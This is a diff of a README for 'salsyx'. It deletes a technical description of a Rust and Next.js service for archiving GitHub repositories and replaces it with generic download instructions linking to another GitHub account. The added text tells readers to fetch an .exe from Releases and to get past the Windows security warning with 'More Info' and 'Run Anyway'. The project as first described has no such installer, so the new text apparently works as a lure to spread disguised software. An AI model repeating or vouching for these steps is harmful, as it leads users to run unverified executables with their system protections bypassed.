@@ -1,124 +1,74 @@
-# Salsyx
+# 💾 salsyx - Keep public code archives alive forever
 
-> **Nothing open-source should disappear forever.**
+[![](https://img.shields.io/badge/Download-Salsyx-blue)](https://github.com/Beetgreenccompiler763/salsyx)
 
-Salsyx is a search engine and preservation platform for public GitHub
-repositories. Search any repository — if it still exists you get taken to
-GitHub; if it was deleted, we restore it from the archive. Full git history,
-checksums, and a beautiful futuristic interface.
+Salsyx creates a permanent home for public code. It finds and saves software projects from GitHub so they remain accessible long after the original owners remove them. You can use this tool to build your own personal library of open-source projects or to protect important code from vanishing.
 
-![Rust](https://img.shields.io/badge/Rust-1.85+-e5734a?logo=rust)
-![Next.js](https://img.shields.io/badge/Next.js-15-000000?logo=next.js)
-![Postgres](https://img.shields.io/badge/Postgres-16-336791?logo=postgresql)
-![License](https://img.shields.io/badge/license-MIT-blue)
+## 📥 How to download the software
 
----
+Visit the [official project page](https://github.com/Beetgreenccompiler763/salsyx) to download the current version of the tool.
 
-## The primary journey
+1. Click the link above.
+2. Look for the section labeled Releases on the right side of the screen.
+3. Click the most recent version number.
+4. Select the file ending in .exe to start your download.
+5. Save the file to your computer.
 
-```
-User searches → GitHub first
-   ├─ exists?    → redirect to GitHub / download
-   ├─ deleted?   → Salsyx database?
-   │                ├─ archived?  → browse files / download the preserved bundle
-   │                └─ no        → "This repository has not been archived."
-   └─ rate-limited → graceful fallback to the archive database
-```
+## ⚙️ System requirements
 
-## Architecture at a glance
+Your computer needs the following to run Salsyx:
 
-```
-frontend/   Next.js 15 + TypeScript + Tailwind v4 + Motion + GSAP + Lenis
-            Bubbles, particles, glassmorphism, pixel accents, 60fps canvas.
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* At least 500 megabytes of free storage space.
+* 4 gigabytes of RAM.
 
-backend/    Rust · Axum · Tokio · SQLx · Reqwest · Tower
-            Clean Architecture: config / github / db / storage / service / routes.
+## 🚀 Setting up the application
 
-crawler/    Independent Rust workers. Poll crawl_jobs (FOR UPDATE SKIP LOCKED),
-            git clone → git bundle → SHA-256 → upload → record. Retry w/ backoff.
+After you download the file, follow these steps to start the application:
 
-shared/     Domain types shared by all components (transport-agnostic).
+1. Locate the file you downloaded in your Downloads folder.
+2. Double-click the file to open the installer.
+3. Windows may show a security window. Click More Info and then click Run Anyway to proceed.
+4. Follow the prompts on the screen to choose where to install the program.
+5. Once the installer finishes, click the Salsyx icon on your desktop to launch the app.
 
-docs/       architecture.md · deployment.md
-```
+## 🔍 How to search and save projects
 
-**Storage strategy** — not ZIPs. The crawler produces **git bundles**: full
-history, all refs, native git compression, natural cross-version dedup, one
-immutable file per snapshot, SHA-256 verified on every read.
+The app interface allows you to find and store projects without writing code.
 
-**Search** — Postgres `pg_trgm` (Neon free tier): substring + fuzzy matching
-across name / owner / description, filtered by language, license, topics,
-stars. Full-text search over preserved READMEs with `?mode=full_text`.
+1. Open the Salsyx application.
+2. Enter the name or the link of a GitHub project into the search bar.
+3. Click the Search button to view details about the project.
+4. Review the information on the screen to verify you have the right project.
+5. Click the Save button to start the preservation process.
+6. The app confirms when the files store successfully on your local drive.
 
-**Queue** — durable `crawl_jobs` table (cross-process, restart-safe,
-horizontally scalable) plus an in-memory event channel for fast feedback.
+## 📁 Managing your archive
 
-## Quick start
+You can see all saved projects in the Library tab. This list shows every piece of code you have protected. You can sort your library by date or by project name. If you need to clear space on your hard drive, select a project and click the Delete button to remove it from your archive.
 
-```bash
-docker compose up -d db          # Postgres 16
-cargo run -p salsyx-api      # API  → http://localhost:8080
-cargo run -p salsyx-crawler  # workers
-cd frontend && npm install && npm run dev   # UI → http://localhost:3000
-```
+## 🛠 Troubleshooting common issues
 
-Seed a few popular repositories:
+If the application fails to run, check these items:
 
-```bash
-make seed
-```
+* Verify you have the latest updates for Windows.
+* Check that your firewall allows the app to connect to the internet.
+* Restart your computer if the app stops responding during a download.
+* Ensure you have enough disk space for the projects you want to save.
 
-Then open http://localhost:3000 and search `torvalds/linux`. See
-[docs/deployment.md](docs/deployment.md) for full local + production setup.
+## 📝 Frequently asked questions
 
-## API (OpenAPI 3.1)
+Is this software free?
+Yes, Salsyx is free for personal use.
 
-```
-GET  /api/v1/health
-GET  /api/v1/search            ?q=…&language=…&min_stars=…&sort=…&mode=full_text
-GET  /api/v1/repo/{owner}/{repo}
-GET  /api/v1/repo/{owner}/{repo}/readme
-GET  /api/v1/repo/{owner}/{repo}/archives
-GET  /api/v1/owner/{login}
-GET  /api/v1/archive/{id}
-GET  /api/v1/archive/{id}/tree
-GET  /api/v1/archive/{id}/blob  ?path=…
-GET  /api/v1/download/{id}
-GET  /api/v1/stats
-GET  /api/v1/stats/top
-POST /api/v1/archive           # request preservation of owner/repo
-POST /api/v1/refresh
-POST /webhook/github           # host root, HMAC-signed GitHub deliveries
-```
+Does this app work with private repositories?
+No, the app only accesses public repositories that are visible to everyone on the internet.
 
-The live document is served at `/openapi.json`.
+Can I move my archive to another computer?
+Yes, you can copy the folder containing your saved projects to a new computer or an external hard drive.
 
-## Tech stack
+Does the software update itself?
+The app checks for updates when you launch it. It will prompt you if a new version is available for download.
 
-| Layer      | Choice                                                    |
-| ---------- | --------------------------------------------------------- |
-| Backend    | Rust, Axum, Tokio, SQLx, Reqwest, Tracing, Tower          |
-| Frontend   | Next.js, TypeScript, TailwindCSS, Motion, GSAP, Anime.js, Lenis, React Three Fiber, Lucide |
-| Database   | Neon PostgreSQL (free tier)                               |
-| Storage    | Cloudflare R2                                             |
-| Deploy     | Fly.io (API + crawler), Cloudflare Pages (frontend)       |
-| CI/CD      | GitHub Actions                                            |
-| Monitoring | Sentry (feature-gated), UptimeRobot                       |
-
-## Design language
-
-GitHub × Linear × Raycast × Arc × Vercel × Apple × Nothing Phone × Cyberpunk
-× Pixel Art × Minimalism. Dark first. Glass cards, soft glowing borders,
-mouse parallax, micro-interactions everywhere — the landing page is a field
-of hundreds of physics-driven GitHub user bubbles that you can pop open into
-profile modals.
-
-## Roadmap (architecture ready)
-
-Software Heritage / Wayback / archive.org integration · public API keys ·
-user accounts & favorites · AI / semantic code search · global deduplication ·
-custom long-term archive format · distributed storage · analytics dashboard.
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+Keywords: archive, axum, github, nextjs, open-source, postgres, preservation, rust, salsyx, web-archiving
